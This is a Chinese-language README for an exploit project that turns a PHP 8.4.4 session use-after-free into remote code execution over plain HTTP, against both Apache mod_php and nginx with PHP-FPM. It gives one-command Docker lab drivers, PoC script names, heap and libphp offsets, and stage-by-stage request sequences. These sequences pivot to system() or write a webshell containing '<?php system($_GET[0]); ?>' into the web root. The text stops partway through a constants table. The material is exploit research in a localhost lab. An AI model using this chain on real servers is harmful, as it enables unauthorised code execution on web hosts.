# PHP2Shell — session UAF → 纯 HTTP RCE(PHP 8.4.4 mod_php 与 nginx + PHP-FPM)

[English](README.en.md) | 中文

同一个漏洞,两条链、两种 SAPI、三套堆标定:

| 链 | 受害者形态 | 代码执行落地方式 | PoC |
| --- | --- | --- | --- |
| mod_php | Apache 2.4.58 prefork + `libphp.so`,页面只有裸 `echo` | 悬空 `zend_reference` → 伪 `HashTable` 的 `pDestructor = zif_system`,最后一个请求直接 `system()` | `exploits/def_rce.py` 等 4 个 |
| nginx + PHP-FPM | nginx 1.24 + 自编译 `php-fpm`(`pm = static`),页面 `session_start()`;`memory_limit` 用 8M 和 PHP 出厂默认 128M 两档,worker 池 1 个和 4 个两种 | 悬空 `BG(unserialize)` 解码器改写 session 落盘目标,FPM worker **自己**把含 PHP 代码的 session 文件写进站点根目录 → 任意文件写入 → 请求该文件执行 | `exploits/fpm_rce.py`、`exploits/fpm128_rce.py`(`WORKERS=n` 同时覆盖单 worker 与多 worker) |

两条链都不需要攻击类/helper 接口,不改目标 PHP 代码,不要求目标重编译,目标上不需要
gdb,ASLR 全程开启,流量全是普通 HTTP。

**mod_php 链**的攻击面只有这 22 个字节:

```php
<?php echo "OK\n"; ?>
```

不需要 `session_start()`。堆基址和 `libphp.so` 基址从 `Set-Cookie` 响应头里取回来,
最后一个请求把一个悬空的 `zend_reference` 变成对 `zif_system` 的调用。

**FPM 链**不需要代码指针,也就不需要 `libphp` 泄漏;作为交换,受害者页面上要真的有
`session_start()`,站点根目录要可写。`memory_limit` 不再是条件:8M 和出厂默认 128M
都打通,后者把压力换成 `filename=""` 的 RFC1867 分片 —— 约 300 字节请求体换约 128 KB
堆,单个请求就能打满 128 MB,而且每个请求都还在 nginx 默认的
`client_max_body_size 1m` 之内。worker 池也不再必须是单个进程:陈旧解码器是每进程
状态,所以按 nginx→FPM 的严格轮询把 N 个子进程逐个 arm,三个阶段就能打在一个
4 进程池上。

已验证目标:我们自己的 `PHP 8.4.4-dev` 构建(Ubuntu 24.04;mod_php 用
`libphp.so` md5 `f402b493b1df82cbf34021b4aef133cb`,镜像内直接附带,保证标定值和被
攻击的二进制永远一致;php-fpm 用 `build-phpfpm.sh` 现场编译,md5
`4b6b73a350e09fcc791c0f20a95ca7d0`)。

> **本项目是衍生工作。** mod_php 的利用链、阶段结构与参考实现来自
> [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp),
> FPM 链的方向来自 Calif 的 php2shell 一文,见[致谢](#致谢)与
> [相比参考链我们解决了哪些痛点](#相比参考链我们解决了哪些痛点)。

## 一键运行

```bash
python p2s.py build            # docker build(apt 默认走中科大源)
                               # 加 --from-source 则先自己编译 mod_php
python p2s.py up               # 创建并启动全部 14 个 mod_php 目标容器
python p2s.py verify           # 页面内容、expose_php、libphp 偏移、worker 数
python p2s.py offsets          # 读取当前目标里的 zif_system / zval_ptr_dtor
python p2s.py exploit off      # 对某个 profile 跑 PoC -> PROOF: uid=33(www-data)
python p2s.py prune            # 回收实验状态:session 文件 + proof 文件
python p2s.py down             # 删除容器

python p2s.py fpm-build        # 第二条链:从同一份 php-src 编译 sapi/fpm
python p2s.py fpm-up           # 起三个 nginx + php-fpm 容器(8112 = 8M,8113 = 128M,8114 = 128M + 4 worker)
python p2s.py verify fpm       # 页面内容、fpm 版本、docroot 可写、memory_limit、池大小
python p2s.py exploit fpm      # FPM 链,memory_limit=8M  -> PROOF: uid=33(www-data)
python p2s.py exploit fpm128   # 同一条链打 PHP 出厂默认 128M -> PROOF: uid=33(www-data)
python p2s.py exploit fpm4     # 同一条链,但 php-fpm 是 4 个子进程的池
python p2s.py prune fpm fpm128 fpm4
                               # 删 session 文件 + 链写出的 shell.php
python p2s.py fpm-down         # 可带 profile 名,不带就三个都删
```

`build` 一次之后,只用 `exploit <profile>` 就够:它会自动重建丢失的容器
(`ensure`)、运行前后清理过期的 session/proof 文件、打印 PoC 输出,拿不到 proof 时
返回非 0。mod_php 的 128M profile 一次利用端到端约 8 秒,FPM 链 8M 约 11.6 秒、
FPM 128M 约 35.5 秒、FPM 128M + 4 worker 约 43 秒(2026-10-24 实测)。
`exploit`/`verify`/`prune` 都接受 `fpm`、`fpm128`、`fpm4` 这三个名字,其余参数
(`-c '…'`)同样有效。

环境变量:

| 变量 | 默认 | 含义 |
| --- | --- | --- |
| `APT` | `cn` | `cn` = 改写为镜像源,`off` = 保留镜像自带源,`skip` = 完全不跑 apt |
| `APT_MIRROR` | `mirrors.ustc.edu.cn` | `APT=cn` 时使用的镜像 |
| `BASE` | `ubuntu:24.04` | 基础镜像 |
| `P2S_CLEAN` | `1` | 设为 `0` 则运行后保留 session/proof 文件 |
| `FPM_PORT` | `8112` | FPM 链 8M 目标的宿主端口 |
| `FPM128_PORT` | `8113` | FPM 链 128M 目标的宿主端口 |
| `FPM4_PORT` | `8114` | FPM 链 128M + 4 worker 池目标的宿主端口 |
| `exploit <p> -c '…'` | `id>/srv/out/pd`(三个 fpm 为 `id`) | 执行的命令;proof 路径跟随 `>/srv/out/<file>` 重定向 |

## 实验环境结构

```
p2s.py                  一键驱动(build/up/down/status/verify/offsets/exploit/prune
                        + fpm-build/fpm-up/fpm-down)
docker/
  Dockerfile            ubuntu:24.04 + apache2 运行库 + 预编译 libphp.so(mod_php 链)
  Dockerfile.fpm        ubuntu:24.04 + nginx + /opt/phpfpm(FPM 链,三个 profile 共用)
  Dockerfile.builder    可选:`build --from-source` / `fpm-build` 的构建依赖
  build-libphp.sh       在其中执行的 php-src 8.4.4 mod_php 编译脚本
  build-phpfpm.sh       在其中执行的 php-src 8.4.4 sapi/fpm 编译脚本
  offsets.py            nm 读取器:写出 env/generated/offsets.env 供 PoC 使用
  bin/libphp.so         标定偏移所用的 PHP 8.4.4-dev 构建
  bin/opcache.so        仅 `opc` profile 使用
  src/php-src-844.tar   对应源码,重建用(136 MB,运行实验并不需要)
  www/index.php         mod_php 受害者页面 —— 22 字节,见下文坑说明
  fpm/nginx.conf        FPM 链:nginx 前置,root /srv/www,.php 走 127.0.0.1:9000
  fpm/php-fpm.conf      `pm = static`、1 个子进程、www-data
  fpm/php.ini           `memory_limit = 8M`、upload_progress On、save_path 可写
  fpm/www/index.php     FPM 链受害者页面:`<?php session_start(); echo "OK\n"; ?>`
  fpm/www/plain.php     裸 `echo` 页,用于填充/取回响应
  fpm128/               同一条链的 128M 目标:与 fpm/ 只差 php.ini 的 memory_limit
                        和 nginx.conf(不提高 body 上限),www/ 两个页面相同
  fpm4/                 128M 目标的多 worker 版:与 fpm128/ 只差 php-fpm.conf 里的
                        `pm.max_children = 4`,ini、nginx.conf、www/ 逐字节相同
  entrypoint.sh         mkdir /srv/out,然后 `apache2 -f /srv/profile/apache.conf`
  entrypoint-fpm.sh     先起 php-fpm,再 `exec nginx -g 'daemon off;'`
env/gen_profiles.py     14 个 profile 的唯一来源 -> env/generated/<name>/
exploits/               PoC(自包含,不含任何宿主机绝对路径)
  exploit.py            从 9bie/php2shell-bypass-aslr-exp 原样保留的参考链
  worker.py             docker exec 辅助:容器名、端口、输出目录、worker 复位
  def_rce.py            display_errors=Off 链(128M/256M/512M/1G,expose_php 两种)
  default_rce.py        display_errors=On + expose_php=Off 链
  dev_on_rce.py         display_errors=On + expose_php=On 链(cookie 告警泄漏 + On stage3)
  dev_off_rce.py        display_errors=On + expose_php=Off 且支持长命令
                        (opcache profile 也用它,靠 CMDOFF 区分)
  fpm_rce.py            nginx + PHP-FPM 链(悬空 BG(unserialize) → 任意文件写入)
  fpm128_rce.py         同一条链打 PHP 出厂默认 memory_limit=128M(空文件名分片加压);
                        WORKERS=n 时按池大小逐个 arm,同时覆盖多 worker 目标
measure/                标定与 gdb 辅助脚本(普通复现不需要)
  利用驱动              measure_dd_any.py、mw_full_test.py、measure_s3_formfill.py、
                        measure_loaded_worker.py、dev_r0.py(重测 R0)
  gdb/gdb-*.py          psdump、s3trace、heapstat、trigger —— 由上述驱动加载
tools/probe.php         可选的 webroot 探针(已加载 ini、指令、扩展)
```

每个 profile 在 `env/generated/<name>/` 下有 `php.ini`、`apache.conf`、`port`。
`p2s.py` 把该目录挂载两次 —— `/srv/profile`(给 Apache)和
`/usr/local/etc/php`(libphp 编译进二进制的 ini 路径,PHP 实际读这里的地方),
再把 `docker/www` 挂到 `/srv/www`、`out-<name>/` 挂到 `/srv/out`。
一个 profile 一个容器,全部只发布在 `127.0.0.1`。

FPM 链有三个容器 `p2s-fpm` / `p2s-fpm128` / `p2s-fpm4`,共用同一个镜像:profile 目录
(`docker/fpm`、`docker/fpm128` 或 `docker/fpm4`)只读挂到 `/srv/fpm`,覆盖镜像里烤进去
的那份配置,所以 8M 与 128M 之间只差一个 `php.ini` 和一行 `client_max_body_size`,
128M 与 4 worker 池之间只差 `php-fpm.conf` 里的 `pm.max_children`。同一个容器里跑
nginx(:80 → 宿主 `FPM_PORT`/`FPM128_PORT`/`FPM4_PORT`,默认 8112/8113/8114)和
php-fpm(容器内 `127.0.0.1:9000`),`docker/<profile>/www` 挂到 `/srv/www`(链要写文件,
所以这个挂载**可写**)、`out-<profile>/` 挂到 `/srv/out`。它们不参与 `up`/`down`/`status`
的 14 个 mod_php profile,用自己的 `fpm-up`/`fpm-down`(可带 profile 名),`status` 会给
活着的那个各多打一行。

## profile 与对应 PoC

| 别名 | 容器 | 端口 | memory_limit | display_errors | expose_php | save_path | worker | opcache | PoC |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| `off` | p2s-def | 8098 | 128M | Off | Off | /tmp | 1 | – | `exploits/def_rce.py` |
| `on` | p2s-on | 8099 | 128M | Off | On | /tmp | 1 | – | `exploits/def_rce.py` |
| `default` | p2s-default | 8096 | 128M | On | Off | /tmp | 1 | – | `exploits/default_rce.py` |
| `dev` | p2s-dev | 8102 | 128M | On | On | /tmp | 1 | – | `exploits/dev_on_rce.py` |
| `ub` | p2s-ub | 8103 | 128M | Off | Off | /var/lib/php/sessions | 1 | – | `exploits/def_rce.py` |
| `ub-on` | p2s-ub-on | 8104 | 128M | Off | On | /var/lib/php/sessions | 1 | – | `exploits/def_rce.py` |
| `off256` | p2s-256 | 8105 | 256M | Off | Off | /tmp | 1 | – | `exploits/def_rce.py` |
| `off512` | p2s-512 | 8106 | 512M | Off | Off | /tmp | 1 | – | `exploits/def_rce.py` |
| `off1g` | p2s-1g | 8107 | 1G | Off | Off | /tmp | 1 | – | `exploits/def_rce.py` |
| `dd256` | p2s-dd256 | 8108 | 256M | On | Off | /tmp | 1 | – | `measure/measure_dd_any.py` |
| `dd512` | p2s-dd512 | 8109 | 512M | On | Off | /tmp | 1 | – | `measure/measure_dd_any.py` |
| `dd1g` | p2s-dd1g | 8110 | 1G | On | Off | /tmp | 1 | – | `measure/measure_dd_any.py` |
| `mw` | p2s-mw | 8100 | 128M | Off | Off | /tmp | 8 | – | `measure/mw_full_test.py`(扇出) |
| `opc` | p2s-opc | 8111 | 128M | On | Off | /tmp | 1 | On | `exploits/dev_off_rce.py` + `CMDOFF=0x7a118` |
| `fpm` | p2s-fpm | 8112 | 8M | Off | On | /var/lib/php/sessions | 1(static) | – | `exploits/fpm_rce.py` |
| `fpm128` | p2s-fpm128 | 8113 | 128M | Off | On | /var/lib/php/sessions | 1(static) | – | `exploits/fpm128_rce.py` |
| `fpm4` | p2s-fpm4 | 8114 | 128M | Off | On | /var/lib/php/sessions | 4(static) | – | `exploits/fpm128_rce.py` + `WORKERS=4` |

前 14 行是 mod_php 链;最后三行是 nginx + PHP-FPM 链,`sapi=fpm`,同一条链的两种
`memory_limit` 与两种池大小,由 `fpm-build`/`fpm-up` 单独管理。

所有 mod_php profile 提供同一个 22 字节页面。`exploit <别名>` 会替你选好 PoC、堆标定
(`PROFILE`)和 proof 路径;`-s <脚本>` 覆盖脚本,`-c` 覆盖命令,结尾的数字设置
`mw` 的扇出宽度(默认取该 profile 的 `MaxRequestWorkers`)。`exploit fpm`/`fpm128`/`fpm4`
同样接受 `-c`,proof 分别落在 `out-fpm/pfpm`、`out-fpm128/pfpm128`、`out-fpm4/pfpm4`;
`fpm4` 这一行还替 PoC 设好 `WORKERS=4`。

本树 2026-10-23 的验证结果:`p2s.py verify` 14 个 mod_php 容器全绿,一次连续
`exploit` 扫描对每个 profile 都拿到
`PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)`
—— `off`、`on`、`default`、`dev`、`ub`、`ub-on`、`off256`、`off512`、`off1g`、
`dd256`、`dd512`、`dd1g`、`opc`、`mw`(对 8 个 prefork 子进程扇出)。
FPM 链:`php-fpm` 二进制由 `fpm-build` 现场编译(链上只有 libc/libm),`exploit fpm`
连续三次独立运行 —— 初始、立刻重跑、以及 `docker restart p2s-fpm`(换一套 ASLR)之后
—— 都拿到 `uid=33(www-data)`,单次约 11.6 秒。
`exploit fpm128` 在 `fpm-build` 的产物上第一次就打通,容器重建(`fpm-down fpm128` +
`fpm-up`)之后重跑同样拿到 `uid=33(www-data)`;2026-10-24 把它并进下面这条通用编排后再
复测一次,仍然打通,单次约 35.5 秒。
`exploit fpm4` 也一样第一次就打通(4 个 static 子进程,单个 arming 轮覆盖 R2a/R2b/R3
三个阶段),`fpm-down fpm4` + `fpm-up fpm4` 重建后重跑再次拿到 `uid=33(www-data)`,
单次约 43 秒(2026-10-24 实测)。

## 相比参考链我们解决了哪些痛点

参考链在
[9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
中的形态是:对 Debian 13 / Apache 2.4.69 上的 PHP 8.4.26 NTS、使用官方
`php.ini-production`(`display_errors=Off`、`memory_limit=128M`)、单 worker
prefork,以 A1 → B1 → A2 → B2 四步完成利用,目标页面只有 `<?php echo "OK\n"; ?>`,
单次约 2 秒。这是基线;下表是本树改动的部分,以及证明它成立的 profile。

| 参考链的痛点 | 本树的做法 | 证据 |
| --- | --- | --- |
| OOM 必须落在 cookie 的 `php_url_encode()` 路径里,也就是要求 `display_errors=Off` | 引入第二个触发器:1001 个 cookie 撞出 `max_input_vars` 告警,告警被打印即置 `headers_sent`,`php_session_send_cookie()` 失败,随后普通 body 填充在 `multipart_buffer_read_body` 里 OOM —— 于是 `display_errors=On` 也能打,而且不需要页级标定 | `default`、`dev`、`dd256/512/1g`、`opc` |
| `memory_limit` 只能保持 128M | 128M / 256M / 512M / 1G 全部打通,两个触发器各自覆盖 | `off256`、`off512`、`off1g`、`dd256`、`dd512`、`dd1g` |
| 只支持单 worker prefork(上游 README 明确说完整 worker 环境之后放出) | 每个 prefork 子进程各发一对 stage-A/B 做扇出;所有子进程 `fork()` 自同一父进程,继承同一份 chunk 与 `libphp` 基址,因此一次泄漏对整个线程池有效 | `mw`(8 个子进程,8 个 stage-B 全部执行) |
| 只覆盖一种 `expose_php` 布局 | 两种都覆盖:`R0 = chunk+0x68140`(Off)、`chunk+0x752E0`(On) | `on`、`dev`、`ub-on` |
| 只覆盖一种 `session.save_path` 布局 | save_path 长度只把 `R0` 移动 `0x20`,于是同一份载体里放置两个相邻伪引用,一个请求同时覆盖短路径与长路径 | `ub`、`ub-on`(`/var/lib/php/sessions`) |
| 未覆盖 opcache | opcache 下可打(载体移到 `CMDOFF=0x7a118`,驱动对该 profile 自动选择) | `opc` |
| 命令塞在一个很小的存活 `zend_string` 里(14 字节;更长的要靠 `sh</out/c` 两步落地) | 独立的 3100 字节 `CMD` 字段携带一个外部伪 `zend_string`(最长约 1.7 KB,含 shell 元字符),伪 `execute_data` 的 arg1 指向它 —— 一次请求,不需要预置文件 | `dev_off_rce.py`、`opc` |
| 「换 PHP 构建/版本需要重新标定偏移」,但标定工具不在交付里 | 重标定属于实验本身:`p2s.py offsets` 从运行中的目标读 `zif_system`/`zval_ptr_dtor` 写入 `env/generated/offsets.env`,`exploit` 自动以 `ZIF_OFF`/`DTOR_OFF` 注入;`R0_OFF`、`CMDOFF`、`NFILL/FILLSZ/S3_BIGLEN`、`BURN_SPEC/TAIL*` 全部可用环境变量覆盖;`measure/dev_r0.py` + `measure/gdb/` 记录每个常量的测法 | 下文「重建受害者二进制」 |
| 目标二进制只能用官方镜像自带的那份 | `build --from-source` 自己从 php-src 编译 mod_php,没有 53 MB 二进制的克隆也能自足 | 下文实测 |
| 交付形式是 `run_pure.sh` + 一个 `exploit.py` | 14 个 profile × 一条命令、`verify`/`status`/`offsets`/`prune`、proof 与脚本自动配对、被外部 `docker prune` 干掉后自愈、中英双语 README | 「一键运行」「回收」 |
| 只有 mod_php 一个 SAPI | 第二条链走 PHP-FPM:SAPI 路径完全不同,利用 pre-RINIT 的悬空 `BG(unserialize)` 解码器改写 session 落盘目标,让 worker 自己把 PHP 代码写进站点根目录 —— 不需要代码指针,也不需要 `libphp` 泄漏 | `fpm`、`fpm128`、下文「利用链(二)」 |
| FPM 链需要把 `memory_limit` 调小才填得满 | 压力从深嵌套字段换成 `filename=""` 的 RFC1867 分片:约 300 字节请求体吃约 128 KB 堆,920 个分片填满足以打死 128 MB 的 worker,PHP 出厂默认限制即可利用;顺带每个请求都落在 nginx 默认 `client_max_body_size 1m` 之内,前置不需要调 | `fpm128`、下文「128M 变体」 |
| FPM 链的陈旧解码器是**每进程**状态,只能钉 `pm = static` + 1 个子进程 | nginx 每个请求新开一条上游连接,FPM 按严格轮询把连接发给空闲子进程,于是先用 N 个 prime 把 N 个子进程逐个 arm,再连续发三个阶段;R2a/R2b 各自打死所在子进程,所以一轮 arm 覆盖 `min(3, N)` 个阶段 | `fpm4`(4 个 static 子进程,一轮打完 R2a/R2b/R3)、下文「多 worker 变体」 |

## 利用链(一)—— mod_php

每阶段两个请求,全部是 chunked 的 multipart/form-data。

**Stage 1 —— 制造悬空状态。** `memory_limit` 在请求启动阶段命中,此时 session 已
初始化、`php_request_shutdown` 尚未执行,于是 worker 继续持有着已经交回分配器的内存
指针。两个触发器:

* `display_errors=Off`(`def_rce`):OOM 发生在 `php_url_encode()` 转义 session id
  以生成 `Set-Cookie` 时,因为 `send_cookie` 仍为 1。要走到那里必须把整个堆精确填满到
  页边界(`BURN_SPEC` 密集 `filename=""` 上传 + `TAILB/TAILC/TAILD/BIGTAIL/…`),
  所以这条链带着一套按 `memory_limit` 分别标定的参数。
* `display_errors=On`(`default_rce`、`measure_dd_any`):1001 个 cookie 触发
  `max_input_vars` 告警,告警打印后置 `headers_sent`,`php_session_send_cookie()`
  失败,`php_session_track_init()` 被跳过;接着用普通填充(`N` 个 4MB 表单字段 + 一个
  巨大字段)在 `multipart_buffer_read_body` 里 OOM。不需要页级标定,只有填充量随
  limit 伸缩。

**Stage 1 泄漏。** 在陈旧 `PS(id)` 仍指向的那些页上放置伪造 `zend_string` 头
(`len = 0x4000`/`0x40000`),下一个请求的 `Set-Cookie: PHPSESSID=…` 就会带回最多
256 KB 堆内容。其中占主导的 2 MB 对齐基址就是 Zend MM main chunk,而每一个与
`zval_ptr_dtor` 同余的 qword 都给出 `libphp.so` 基址(即与 ASLR 无关)—— 正常一次
运行里有 31 个匹配 qword,已与 `/proc/1/maps` 对照校验。

**Stage 3 —— 执行代码。** 请求 A 用 `PHPSESSID=bbbb…` +
`PHP_SESSION_UPLOAD_PROGRESS` 重放触发器,于是 `php_session_track_init()` 在已知
chunk 偏移(`R0`)处分配 session 的 `zend_reference`,随后请求死掉,留下
`PS(http_session_vars)` 悬空。请求 B 喷入一个正好落在 `R0` 上的值,内含伪
`zend_reference`(`rc=1`、`type=0x1a`),其 `val.value` 指向 `R0+0x28` 处的伪
`HashTable`,`pDestructor = zif_system`。于是
`zend_reference_destroy` → `zend_array_destroy` → `zend_hash_destroy` → `system(cmd)`。

`session.save_path` 长度只会让 `R0` 偏移 `0x20`,所以载体里放两个相邻伪引用,一个
请求同时覆盖两类路径(`/tmp` 与长路径)。命令不是 14 字节内联串:独立的 3100 字节
`CMD` 字段携带外部伪 `zend_string`(最长约 1.7 KB,含 shell 元字符),伪
`execute_data` 的 arg1 指向它。

## 利用链(二)—— nginx + PHP-FPM

这条链不借 mod_php 的请求启动 bailout,也不需要代码指针 —— 目标是让 FPM worker
**自己**把带 PHP 代码的 session 文件写进站点根目录。关键在于 SAPI 的顺序:
`php_request_startup()` 先调 `sapi_activate()`(`main/main.c:1835`),
而 `sapi_activate()` 里就会读 body(`main/SAPI.c:469`),multipart 解析回调
`php_session_rfc1867_callback` → `php_session_initialize()` → `s_read` →
`php_session_decode()` 全部发生在模块 RINIT **之前**;而负责把 `BG(unserialize)`
清零的 `PHP_RINIT_FUNCTION(basic)`(`ext/standard/basic_functions.c:407`)
要到 `zend_activate_modules()` 才跑。于是这条链能拿到 mod_php 链拿不到的东西:
一个跨请求活着的悬空解码器。

`exploits/fpm_rce.py` 一共发 5 类请求,三个 decode 目标逐步逼近落盘写入器
(`exploits/fpm128_rce.py` 是同一个序列换一套堆标定,再按 `WORKERS` 适应多 worker 池,
见本节末「128M 变体」与「多 worker 变体」):

1. **R1 —— 把 payload 变成 session 里的一个 key。** 带
   `PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET[0]); ?>` 的上传请求让 PHP 把这个
   字符串当 session key 写进 `sess_scal`;紧跟其后的 890 个 depth-60 嵌套字段让解析
   在 `session.upload_progress.cleanup` 的 END 清理删掉它之前 OOM,于是磁盘上的文件
   永远带着 `upload_progress_<?php system($_GET[0]); ?>|i:0;`。
2. **prime —— 留下悬空解码器。** 先 `build_A()` 往 `sess_asx` 里灌 73 条 progress 记录
   加一条文件名长 1 MB 的记录(同样靠嵌套墙躲过清理),然后 POST `/index.php`
   (那页真的 `session_start()`):pre-RINIT 的 `php_session_decode()` 在
   `php_var_unserialize()` 里撞上 8M 限制,`zend_catch` → `php_session_cancel_decode()`
   → `zend_bailout()`,`PHP_VAR_UNSERIALIZE_DESTROY()` 永远不执行
   (`ext/session/session.c:274`)。请求死了,但进程级的
   `BG(unserialize)` 仍指向那些已经交回分配器的 `var_entries` / `var_dtor_entries` 块。
3. **R2a/R2b/R3 —— 用陈旧块做「按次数控制的 8 字节写」。** 下一个 progress 请求的
   `BIG` 字段重新占住那些 chunk 页(`E_OFF = 0x76000` 是伪 entries 块、
   `DT_OFF = 0xDC000` 是伪 dtor 块),解码器读到的块内容就是请求体内容。
   `var_push()` 做的事是 `var_hash->data[used_slots++] = rval`
   (`ext/standard/var_unserializer.re:132`),块基址
   `E_OFF`、`data[0]` 在 `E_OFF+16`,所以把 `used_slots` 设成 N 就等于选择「下一次
   push 写到 `E_OFF + 16 + 8N`」;设成负数(`LAST_DELTA = -0x3BD0`)就往回打。
   * R2a:打到 `chunk+0x63058` —— `php_session_rfc1867_progress::data` 这个 zval 的
     type_info 字段(`data` 在结构 +0x50,块基址 `0x63000`,容器里 `gdb -ex 'ptype /o'`
     核对过),把进度数组变成标量。
   * R2b:打到 `chunk+0x63050` —— 同一个 zval 的 value,让它指回一个 8 槽伪数组。
   * R3:用负 `used_slots` 打到 `chunk+0x58190`(= `E_OFF+16 + 8*LAST_DELTA`,落盘
     写入器那一段),同一请求的伪 dtor 块里再放好计数 `19` 和
     `"/srv/www/shell.php"` 字节 —— 解码器把它们当成写入目标。
4. **落盘即写入。** 同一个请求结束时 `php_session_rfc1867_update()` →
   `php_session_flush()` → `ps_files_write()`(`ext/session/mod_files.c:227`)
   把 session 数据写出去:不再是 `/var/lib/php/sessions/sess_scal`,而是站点根目录下的
   `shell.php`。
5. **执行。** `GET /shell.php?0=id` —— 这个文件本身就是 session 文件,PHP 会吃掉
   `<?php … ?>` 标签并执行,命令输出夹在 payload key 与下一条记录之间回显。

shaping 请求(1、2)把 worker 打死是设计的一部分:FPM 立刻 fork 替补,而进程静态的
`BG(unserialize)` 与 chunk 布局照旧。8M 目标上整条链约 11.6 秒。

### 128M 变体(`exploits/fpm128_rce.py`)

同一套原语、同一个请求序列,只把堆标定换成 PHP 出厂默认的 `memory_limit=128M`:

* **压力源**从深嵌套的普通字段换成 `filename=""` 的 RFC1867 分片 ——
  `"x<k>[a][a]…"`(depth 60)、空值、空文件名。约 300 字节请求体对应约 128 KB 堆,
  `PRESS=920` 个分片就足以打死一个 128 MB 的 worker。
* **伪块填充字段**从 `FILLER=540672`(132 页)缩到 `131072`(32 页,起于第
  `FSTART=100` 页):仍然盖得住 `E_OFF=0x76000`(第 118 页),而陈旧 dtor 块从
  `0xDC000`(第 220 页)搬到 `DT_OFF=0x7C000`(第 124 页)。三个 push 目标
  (`0x63058`/`0x63050`/`0x58190`)与 8M 版一致 —— 它们由结构体布局决定,与限制无关。
* **A session** 是 73 条小记录 + 20 条 `FNLEN=750000` 文件名记录(8M 版为 1 条 1 MB),
  落盘 15,029,535 字节。
* **prime 请求**用 `FIELDS=170` 个 4000 字节字段 + `PRIME_PRESS=780` 个压力分片 + `DUP`
  重名字段。780 刻意低于 920:body 解析阶段必须活着走到 `session_start()`,让
  `php_session_decode()` 而不是解析器去撞限制。
* **前置零调参**:每个请求实测 R1 272,529 · A-small 272,501 · A-big 1,022,503 ·
  prime 925,016 · R2b 403,567 · R3 131,357 字节,全部在 nginx 默认
  `client_max_body_size 1m`(1,048,576)之内 —— A-big 只剩约 26 KB 余量,所以 `FNLEN`
  是环境变量而不是常量。
* **状态码**在两个目标上不同:8M 的 shaping 请求回 502/500,128M 的回 200(子进程已经
  flush 过响应头才被打死,nginx 只能照常收尾)。同一次 OOM,`wait_target()` 轮询到
  `/plain.php` 重新 200 才继续,所以两边都正常走完。
* 端到端约 35.5 秒,大头是 93 条 A 记录每条都要等 worker 复活(2026-10-24 用
  `WORKERS=1` 复测;之前 33.8 秒的那版 PoC 没有每轮 arm 前的 disarm 轮)。

### 多 worker 变体(`WORKERS=n`)

128M 那个 PoC 用 `WORKERS` 描述池大小,`exploit fpm4` 会替它设成 4
(`docker/fpm4/php-fpm.conf` 是 `pm = static` + `pm.max_children = 4`),标定值与
128M 单 worker 完全一致 —— 换的只是编排。

* 陈旧 `BG(unserialize)` 是每进程状态,所以 prime 只对**打死它之前最后一个服务该请求
  的那个子进程**有效。`WORKERS` 必须等于存活子进程数,否则阶段可能打在没 arm 的进程上。
* arm 的依据是 nginx 每个请求新开一条上游连接、FPM 把连续连接按严格轮询发给空闲
  子进程:先把 N 个 A session 依次灌满(`asx0`…`asx3`,每个 93 条记录),然后**连续**
  发 N 个 prime,一个不落 —— 这 N 个请求各打中一个子进程,arm 整个池。
* prime 与三个阶段之间不允许任何请求,连存活探测都不行:一次走到脚本执行的请求会跑
  `PHP_RINIT(basic_functions)`,把刚留下的解码器清零。PoC 因此把 `disarm()` 做成
  `2 × WORKERS` 次 `GET /plain.php`(次数是池大小的整数倍,轮询相位不变),而
  `wait_target()` 只出现在 arm 之前。
* R2a 与 R2b 会各自打死所在的子进程,R3 不打死(它要活着把文件写出去),所以一轮
  arm 覆盖 `min(3, WORKERS)` 个阶段:`WORKERS>=3` 一轮打完三个阶段,2 需要中途补 arm,
  1 则每个阶段都重新 arm(等价于上一节的单 worker 序列)。
* 阶段打在未 arm 的进程上会清掉 payload 记录(整条链要重来)。PoC 对此的处置是重试:
  每次尝试用**全新的 session id**(`scal` → `scal1`…、`asx0` → `asx01`…),避免打在
  半改写的 session 上;池模式的默认 `ATTEMPTS=3`,单 worker 是 1。
* 实测(2026-10-24):4 个 static 子进程,单轮 arm 打完三个阶段,两次运行都打通 ——
  全新容器 42.3 秒(shaping 请求全程回 200)、`fpm-down`/`fpm-up` 重建后 43.2 秒
  (`R2a -> 502`,arm 中的子进程果然被打死)。状态码跟着 flush 时机变,与下面「状态码」
  那条坑一致,判定成功仍然看写出来的 shell 有没有回显。

## 常量

| 项目 | 值 |
| --- | --- |
| `zif_system` | `libphp + 0x457FE0` |
| `zval_ptr_dtor` | `libphp + 0x64B890` |
| `R0`(expose_php=Off) | `chunk + 0x68140` |
| `R0`(expose_php=On) | `chunk + 0x752E0` |
| 伪 HashTable | `R0 + 0x28`(或 `CMD` 副本固定位于 `chunk + CMDOFF + 0x700`) |
| `CMDOFF` | Off 为 `0x83118`,On 为 `0x84118`,opcache 下 `0x7a118` |
| chunk 大小 | `0x200000`(`ZEND_MM_CHUNK_SIZE`) |

### 常量(FPM 链,8M)

| 项目 | 值 | 说明 |
| --- | --- | --- |
| `E_OFF` | `chunk + 0x76000` | 陈旧 `var_entries` 块(= 填充第 118 页 `ENTPAGE`) |
| `DT_OFF` | `chunk + 0xDC000` | 陈旧 `var_dtor_entries` 块(= 填充第 220 页 `DTPAGE`) |
| push 目标 | `0x63058` 标量化、`0x63050` 伪数组、`0x58190` 落盘写入器 | `E_OFF + 16 + 8*used_slots` |
| `LAST_DELTA` | `-0x3BD0` | 负 `used_slots`,让 push 回打到 `0x58190` |
| progress 块 | `chunk + 0x63000` | `php_session_rfc1867_progress`,结构体 144 字节 |
| R3 伪字符串 | `len(FPM_SHELL)+1` = `19`,值跟在 `DT_OFF+0x38` | 长度含结尾 NUL:`ps_files_path_create()` 只 memcpy `ZSTR_LEN(basedir)` 个字节,`open()` 在那个 NUL 处截断 |
| 填充字段 | `FILLER=540672` B,起于第 `FSTART=100` 页 | 伪块按绝对 chunk 偏移打补丁 |
| session 记录 | `SMALL=73` 条 + 1 条 `FNLEN=1000000` B 文件名 | prime 前奏 `build_A()` |
| 嵌套墙 | `NESTED=890` / prime `PRIME_NESTED=300`,`LEVELS=60` | 在 END 清理之前 OOM |
| prime 请求 | `FILL_FIELDS=700` × `FILL_LEN=4000` + `DUP` 重名字段 | 撞 8M 限制 |
| ini | `memory_limit=8M`、`post_max_size=8M`、upload_progress On+cleanup On | `docker/fpm/php.ini`,nginx `client_max_body_size 8m` |

### 常量(FPM 链,128M)

| 项目 | 值 | 说明 |
| --- | --- | --- |
